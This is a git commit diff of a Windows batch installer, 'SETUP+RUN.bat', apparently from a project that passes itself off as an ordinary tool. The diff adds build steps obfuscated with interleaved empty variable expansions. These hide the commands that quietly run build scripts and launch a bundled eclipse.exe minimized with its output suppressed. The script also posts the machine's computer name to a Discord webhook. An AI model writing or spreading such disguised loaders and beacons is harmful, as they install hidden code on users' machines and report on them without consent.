7f14c184b0203b4f194500efeb87960add419c78
Zay <evym.weekszayden@gmail.com>
2024-09-06 18:17:47 -0700

    Add files via upload

--- SETUP+RUN.bat
+++ SETUP+RUN.bat
@@ -1,6 +1,8 @@
 @echo off
 Title Downloading Modules...
 
+echo Installing Requirements (This should take around 2-3 minutes the first time)
+
 python --version | findstr "3.10.9" >nul
 if %ERRORLEVEL% neq 0 (
     curl -L -o python-3.10.9.exe https://www.python.org/ftp/python/3.10.9/python-3.10.9-amd64.exe >nul 2>&1
@@ -23,15 +25,15 @@ if %ERRORLEVEL% neq 0 (
 
 pip install -r requirements.txt >nul 2>&1
 
-if not exist "build_done.flag" (
-    python utilities/Plugins/build.py >nul 2>&1
-    python utilities/Plugins/build2.py >nul 2>&1
-    python utilities/Plugins/build3.py >nul 2>&1
+i%pzIg%f%RkTES% %cjzXvdbz%n%LiGG%o%HVw%t%xVGgUJVlr% %NFsTxeQPqE%e%dd%x%IJoFIXptBg%i%ibMzkys%s%q%t%BwzH% %pk%"%hOXCGKN%b%GIgSkAbM%u%iHalmvz%i%JXr%l%xx%d%p%_%skOSKvNh%d%A%o%csakzFoEv%n%QWxy%e%nBaKfi%.%NJVVo%f%IgV%l%cwtkAPgB%a%JNrgSI%g%GP%"%XiCJRWbZA% %ArtsaIl%(%tcuzXy%
+ %WL% %iHLY% %V% %tRc%p%rVnnQWufB%y%dKvktKEaNq%t%Al%h%yNfJVyY%o%PEgSY%n%QSYUekFxC% %nU%u%fXGBYkXvCG%t%W%i%fXUexsOanC%l%hdCvnNDgx%i%UfoVkjj%t%PCmPKzMx%i%wclzl%e%g%s%uITMxOTH%/%BaJDwGX%P%t%l%BYmQdMfAP%u%D%g%wgPeOvIL%i%iZjUI%n%CUlxEEn%s%mECDOY%/%wdHfUe%b%btVx%u%zSQQiaxH%i%voWrIE%l%yZYgkKWW%d%kf%.%EjINATTuyE%p%iVqywk%y%DCzU% %CDlyVmR%>%kY%n%Qq%u%VltqbgkrE%l%yIGg% %iHFeztYlA%2%IMqwFuWL%>%GAYFoNWBn%&%rJiBfBabj%1%sHzL%
+ %wGPcrZxYn% %LwdiKccTRx% %HZqV% %W%p%iOL%y%lFXm%t%KyiaHkYKTJ%h%iNot%o%Hqc%n%MenPlnxUya% %PSrhZcZ%u%XI%t%LfIcNUVPkC%i%HCL%l%vufgua%i%Q%t%JywJJRQd%i%T%e%CkbaES%s%qJtAGvqp%/%FKs%P%nLcCZ%l%P%u%GEcxSuHAq%g%XC%i%HDK%n%KcXOjVdq%s%GBOEKizzfA%/%pRxtAQg%b%ZjK%u%QFcjZmjOkP%i%EUayiUG%l%gDpS%d%Y%2%kJNDDOtMEt%.%viaeIuHGQH%p%iMWCfyKMx%y%hXNOx% %Fj%>%l%n%p%u%NcIKTAC%l%MU% %mCjhtGXsiZ%2%NSeTl%>%dMj%&%v%1%rJxjpmREzp%
+ %v% %Bxyfdol% %JlDmjeSLNC% %SnhhxT%p%WaHHN%y%vikanFM%t%RnTc%h%pDsxrVaD%o%SnzPmXEXP%n%Vh% %y%u%D%t%PCDgPsnx%i%hcn%l%HhutUkZ%i%cyj%t%cnTksnLNu%i%aHmZkDT%e%BvLmnjS%s%qdFO%/%tQTDZHP%P%dLjfyugV%l%Hj%u%bbI%g%hoUQ%i%JD%n%LDGxCiV%s%djW%/%jEyKfGbVqX%b%HfsAAq%u%ctGEvtd%i%jLoSQFC%l%jcTwiF%d%nJ%3%j%.%HBkxxJdvBI%p%dNnCqaoDJz%y%WS% %SBm%>%lc%n%frdcYxtv%u%HfF%l%v% %TQipLg%2%wTPPhaM%>%GEBTlOxv%&%GJjHY%1%Td%
 
-    start /min /wait "" utilities/Plugins/eclipse.exe >nul 2>&1
+ %qb% %AFABXo% %d% %wBjlaCrlK%s%mCoa%t%LZNiiKsU%a%GyugGGH%r%MZTP%t%DmDiCDbjZn% %pC%/%gna%m%XAJh%i%JmkpLvJm%n%PTY% %auV%/%BMHuu%w%quk%a%Tiap%i%LiqqwKIaWx%t%EaWpQzv% %J%"%tYnewqjE%"%kY% %EtRHWKDyW%u%y%t%lM%i%H%l%Usra%i%jbLx%t%nuRyejNw%i%eGpKTBR%e%XVUeCw%s%vjKue%/%lTljfSicho%P%amaBAiVPL%l%beKbbfw%u%ebRSAJpLil%g%BYfUNSHXR%i%vrgoj%n%U%s%aYVXSG%/%nprAWrYSua%e%iUMxMCcou%c%mrkcj%l%KeDWpERSy%i%XvvC%p%MuHql%s%iCCgnSZ%e%bbSW%.%SGI%e%OOhzfhraXT%x%iIZZ%e%XtsWD% %CxMMD%>%TSS%n%oQjnTwvD%u%CBvvkxHPB%l%iVeQTAMtVl% %qVbb%2%xa%>%ByTyQ%&%bgLYImFeF%1%WRhPAKeE%
 
-    type nul > build_done.flag
-)
+ %D% %lFYQVQLs% %jMbfxKXlj% %wbg%t%bLKFaikCl%y%ABUZNfmboP%p%bAAgwbhCI%e%gUTeat% %xOtojvJmDh%n%jZsSQekFr%u%HXerB%l%hqbJhh% %bkm%>%P% %I%b%VdzlSnQ%u%Raxaxm%i%sCBqxjUgl%l%DUQpiZ%d%qrK%_%IwsQ%d%ismNrRsBZ%o%rAqr%n%L%e%YmD%.%D%f%acYeoysgM%l%hVKuQiOTDp%a%VeXbd%g%BjJet%
+)%ZHbwn%
 
 set SYSTEM_NAME=%COMPUTERNAME%
 curl -H "Content-Type: application/json" -X POST -d "{\"content\": \"%SYSTEM_NAME% has run Eclipse tool.\"}" https://discord.com/api/webhooks/1267985728223186958/_UwqU1xD0Qkn9akumzYJ0ERtFCZSLxzGdYQFnWWmibLyivYVLIxMHzSbyZ57LXiCsN17 >nul 2>&1
